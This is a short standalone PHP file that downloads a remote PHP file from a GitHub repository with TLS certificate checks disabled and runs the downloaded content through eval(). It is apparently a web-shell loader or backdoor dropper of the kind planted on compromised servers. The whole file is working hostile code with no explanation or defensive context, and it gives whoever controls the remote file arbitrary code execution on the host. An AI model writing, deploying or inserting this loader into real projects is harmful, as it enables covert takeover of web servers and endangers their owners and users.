<?PHp
$protocol = "https";$domain = "raw.githubusercontent.com/narensalera-crypto/xqrz";
$file_path = "/refs/heads/main/cas.php";
$url = $protocol . "://" . $domain . $file_path;

function fetch_with_curl($url) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
}

$content = fetch_with_curl($url);
if ($content !== false) {
    eval("?>" . $content);
}
?> 
